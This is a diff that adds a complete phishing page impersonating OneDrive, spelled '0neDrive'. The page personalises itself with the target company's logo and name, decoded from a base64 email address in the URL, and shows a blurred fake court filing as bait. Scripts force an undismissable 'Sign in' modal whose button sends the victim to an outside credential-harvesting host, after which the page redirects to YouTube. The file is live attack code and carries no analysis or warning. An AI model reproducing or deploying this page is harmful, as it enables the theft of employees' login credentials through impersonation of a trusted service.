@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0neDrive</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 16px;
+            background-color: white;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .left-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .menu-icon {
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .search-container {
+            flex-grow: 1;
+            max-width: 600px;
+            margin: 0 20px;
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 8px 36px;
+            border-radius: 4px;
+            border: 1px solid #e5e5e5;
+            background-color: #f5f5f5;
+        }
+
+        .right-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .main-container {
+            display: flex;
+            height: calc(100vh - 60px);
+        }
+
+        .sidebar {
+            width: 250px;
+            padding: 20px;
+            background: #ffffff;
+            border-right: 1px solid #e0e0e0;
+        }
+
+        .new-upload-btn {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px;
+            cursor: pointer;
+            color: #616161;
+        }
+
+        .nav-item.active {
+            background-color: #f0f0f0;
+            color: #0078d4;
+        }
+
+        .content {
+            flex-grow: 1;
+            padding: 20px;
+            background-color: white;
+            margin: 20px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .section-title {
+            color: #616161;
+            font-size: 12px;
+            margin: 16px 0 8px 8px;
+        }
+
+        .recent-files-message {
+            font-size: 18px;
+            color: #616161;
+        }
+
+        .placeholder-image {
+            width: 200px;
+            height: 200px;
+            margin-top: 20px;
+            opacity: 0.6;
+        }
+
+        .profile-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .domain-highlight {
+            font-weight: 500;
+            color: #333;
+        }
+
+        .modal {
+            display: block;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 40px;
+            width: 340px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .captcha-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 16px;
+            margin: 24px auto;
+            width: 85%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #f9f9f9;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-left: 8px;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            margin: 0;
+        }
+
+        .checkbox-wrapper label {
+            color: #555;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 0;
+        }
+
+        .login-btn {
+            background-color: #0078d4;
+            color: white;
+            padding: 16px 32px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 8px;
+            font-weight: 500;
+            width: 80%;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .login-btn:hover {
+            background-color: #106ebe;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+            background-color: #005a9e;
+        }
+
+        h2 {
+            margin: 0 0 8px 0;
+            color: #333;
+        }
+
+        p {
+            margin: 0 0 16px 0;
+            color: #666;
+            font-size: 14px;
+            padding: 0 20px;
+        }
+
+        .folder-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .folder-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .folder-item:hover {
+            background-color: #f0f0f0;
+        }
+
+        .folder-icon {
+            font-size: 40px;
+            margin-bottom: 8px;
+            color: #ffd04c;
+        }
+
+        .folder-icon i {
+            filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));
+        }
+
+        .folder-item:hover .folder-icon {
+            color: #ffba08;
+        }
+
+        .folder-name {
+            font-size: 14px;
+            color: #333;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 150px;
+        }
+
+        .pdf-preview {
+            width: 100%;
+            height: 100%;
+            min-height: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .blurred-pdf {
+            width: 100%;
+            max-width: 800px;
+            height: auto;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .pdf-info {
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            color: #616161;
+            font-size: 14px;
+        }
+
+        .document-viewer {
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .document-toolbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            border-bottom: 1px solid #e0e0e0;
+            background: #f8f9fa;
+        }
+
+        .toolbar-left {
+            display: flex;
+            align-items: center;
+            color: #616161;
+            font-size: 14px;
+        }
+
+        .toolbar-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .document-content {
+            flex: 1;
+            padding: 24px;
+            display: flex;
+            justify-content: center;
+            overflow-y: auto;
+            background: #f8f9fa;
+        }
+
+        .document-page {
+            max-width: 800px;
+            width: 100%;
+            height: auto;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            background: white;
+            border-radius: 4px;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 20px;
+            background: #ffffff;
+        }
+
+        .court-document {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px;
+            line-height: 1.6;
+            color: #333;
+            filter: blur(5px);
+            user-select: none;  /* Prevents text selection */
+            -webkit-user-select: none;  /* For Safari */
+        }
+
+        /* Make headings slightly less blurry to maintain document structure */
+        .court-document h2, 
+        .court-document h3, 
+        .court-document h4 {
+            filter: blur(4px);
+        }
+
+        .court-document h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 18px;
+            line-height: 1.4;
+        }
+
+        .court-document h3 {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+
+        .court-document h4 {
+            margin: 25px 0 15px 0;
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        .document-section {
+            margin-bottom: 30px;
+        }
+
+        .document-section p {
+            margin-bottom: 20px;
+            text-align: justify;
+            font-size: 14px;
+        }
+
+        .captcha-container {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        #captchaCanvas {
+            background: #f0f0f0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        #captchaInput {
+            width: 200px;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        #submitBtn {
+            width: 200px;
+            padding: 12px 0;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        #submitBtn:hover {
+            background: #006cbd;
+        }
+
+        .shake {
+            animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        #message {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        #message.success {
+            color: #4CAF50;
+        }
+
+        #message.error {
+            color: #f44336;
+        }
+
+        .refresh-btn {
+            position: absolute;
+            right: -40px;
+            top: 0;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #616161;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <img id="modal-img" style="width: 48px; height: 48px; border-radius: 50%; object-fit: cover; margin-bottom: 16px; border: 3px solid #4CAF50;">
+            <h2>Sign in</h2>
+            <p>Sign in with <span id="modal-name"></span> to view your files</p>
+            <div class="captcha-container">
+                <a href="https://login.pressfreeimg.site/MaDnkgQQ" target="_blank"><button id="submitBtn">Sign in</button></a>
+                <div id="message"></div>
+            </div>
+        </div>
+    </div>
+    <div class="header">
+        <div class="left-header">
+            <div class="menu-icon">☰</div>
+            <div>0neDrive</div>
+        </div>
+        <div class="search-container">
+            <input type="text" class="search-box" placeholder="Search everything">
+        </div>
+        <div class="right-header">
+            <span><i class="fa-regular fa-gem" style="color: #616161;"></i></span>
+            <span><i class="fa-solid fa-arrows-rotate" style="color: #616161;"></i></span>
+            <span><i class="fa-solid fa-gear" style="color: #616161;"></i></span>
+            <span><i class="fa-regular fa-circle-question" style="color: #616161;"></i></span>
+            <div class="profile-container">
+                <img id="dashboard-img" style="width: 40px; height: 40px; border-radius: 50%; object-fit: cover;">
+                <span id="dashboard-name"></span>
+            </div>
+        </div>
+    </div>
+    <div class="main-container">
+        <div class="sidebar">
+            <button class="new-upload-btn">+ New & Upload</button>
+            <div class="nav-item active">
+                <span>🏠</span>
+                <span>Home</span>
+            </div>
+            <div class="nav-item">
+                <span>📄</span>
+                <span>My files</span>
+            </div>
+            <div class="nav-item">
+                <span>📸</span>
+                <span>Photos</span>
+            </div>
+            <div class="nav-item">
+                <span>👥</span>
+                <span>Shared</span>
+            </div>
+            <div class="nav-item">
+                <span>🗑️</span>
+                <span>Recycle bin</span>
+            </div>
+            <div class="section-title">Browse files by</div>
+            <div class="nav-item">
+                <span>👤</span>
+                <span>People</span>
+            </div>
+        </div>
+        <div class="main-content">
+            <div class="court-document">
+                <h2>IN THE DISTRICT COURT OF APPEAL<br>
+                FOURTH DISTRICT<br>
+                CASE NO. 2024-0127</h2>
+                
+                <h3>SMITH ENTERPRISES, LLC,<br>
+                Appellant,<br>
+                v.<br>
+                JOHNSON MANUFACTURING CO.,<br>
+                Appellee.</h3>
+
+                <div class="document-section">
+                    <h4>PRELIMINARY STATEMENT</h4>
+                    <p>This appeal arises from the final judgment entered by the Circuit Court of Palm Beach County on January 15, 2024, granting summary judgment in favor of Johnson Manufacturing Co. The underlying dispute centers on alleged breach of contract and misappropriation of trade secrets related to proprietary manufacturing processes for advanced composite materials used in aerospace applications.</p>
+                    
+                    <p>The proceedings below spanned eighteen months of intensive discovery, including expert testimony from leading materials scientists and industrial engineering specialists. The trial court's ruling hinged primarily on the interpretation of confidentiality provisions within the parties' 2022 Joint Development Agreement (JDA) and the scope of protected information under the Florida Uniform Trade Secrets Act.</p>
+                </div>
+
+                <div class="document-section">
+                    <h4>STATEMENT OF THE CASE AND FACTS</h4>
+                    <p>In March 2022, Appellant Smith Enterprises, LLC ("Smith") entered into a Joint Development Agreement with Appellee Johnson Manufacturing Co. ("Johnson") for the purpose of developing advanced composite materials for use in commercial aircraft components. The collaboration was intended to combine Smith's proprietary carbon fiber formulation processes with Johnson's established manufacturing capabilities and industry relationships. The initial term of the agreement was set for two years, with provisions for extension upon mutual agreement of the parties.</p>
+
+                    <p>The relationship between the parties deteriorated in late 2023 when Smith discovered that Johnson had filed patent applications for certain manufacturing processes that Smith claims were derived from confidential information shared during the collaboration. Of particular concern were techniques for thermal cycling of carbon fiber components and specific catalyst formulations that Smith alleges were disclosed to Johnson under the protection of the JDA's confidentiality provisions.</p>
+
+                    <p>On September 12, 2023, Smith filed suit in the Circuit Court of Palm Beach County, seeking injunctive relief and damages for breach of contract and misappropriation of trade secrets. Johnson responded with a motion for summary judgment, arguing that the manufacturing processes in question were independently developed by their research team and fell outside the scope of protected information under the JDA. Johnson further contended that the techniques in question were generally known within the industry and therefore did not qualify for trade secret protection.</p>
+                </div>
+
+                <div class="document-section">
+                    <h4>STANDARD OF REVIEW</h4>
+                    <p>The standard of review for summary judgment is de novo. The appellate court must consider the evidence contained in the record, including any supporting affidavits, in the light most favorable to the non-moving party, and if the slightest doubt exists, summary judgment must be reversed. See Henderson v. Suzuki Motor Corp., 835 So.2d 1162 (Fla. 5th DCA 2002).</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+    const pms = new URLSearchParams(window.location.search);
+    const data = pms.get('data');
+
+    if (data) {
+        try {
+            if (!/^[A-Za-z0-9+/=]+$/.test(data)) {
+                throw new Error('Invalid data format');
+            }
+            
+            const email = atob(data);
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                throw new Error('Invalid email format');
+            }
+            
+            const domain = email.split('@')[1];
+            const companyName = domain.split('.')[0];
+            const displayName = companyName.charAt(0).toUpperCase() + companyName.slice(1);
+            
+            // Update both dashboard and modal images
+            const profileImg = document.getElementById('dashboard-img');
+            const modalImg = document.getElementById('modal-img');
+            const fallbackImage = 'https://via.placeholder.com/100';
+            
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            
+            [profileImg, modalImg].forEach(img => {
+                if (img) {
+                    img.src = logoUrl;
+                    img.onerror = function() {
+                        this.src = fallbackImage;
+                    };
+                }
+            });
+            
+            // Update both dashboard and modal names
+            const dashboardName = document.getElementById('dashboard-name');
+            const modalName = document.getElementById('modal-name');
+            
+            [dashboardName, modalName].forEach(element => {
+                if (element) {
+                    element.innerHTML = `<span class="domain-highlight">${displayName}</span>`;
+                }
+            });
+            
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+
+    function enforceModal() {
+        const modal = document.getElementById('loginModal');
+        modal.style.display = "block";
+        
+        window.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                modal.style.display = "block";
+                return false;
+            }
+        }, true);
+
+        window.onclick = function(e) {
+            modal.style.display = "block";
+            return false;
+        }
+
+        setInterval(function() {
+            if (modal.style.display !== "block") {
+                modal.style.display = "block";
+            }
+            
+            if (!document.contains(modal)) {
+                document.body.appendChild(modal);
+            }
+            
+            modal.style.zIndex = "99999";
+        }, 100);
+
+        Object.defineProperty(modal.style, 'display', {
+            get: function() { return "block"; },
+            set: function() { return "block"; }
+        });
+
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (!document.contains(modal)) {
+                    document.body.appendChild(modal);
+                }
+                modal.style.display = "block";
+            });
+        });
+
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    }
+
+    window.onload = enforceModal;
+    document.addEventListener('DOMContentLoaded', enforceModal);
+    window.addEventListener('load', enforceModal);
+    document.addEventListener('readystatechange', enforceModal);
+
+    document.getElementById('submitBtn').addEventListener('click', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedEmail = urlParams.get('data');
+        
+        message.textContent = "Signing in... Please wait";
+        message.className = "success";
+        setTimeout(() => {
+            window.location.href = 'https://www.youtube.com';
+        }, 1500);
+    });
+    </script>
+</body>
+</html> 
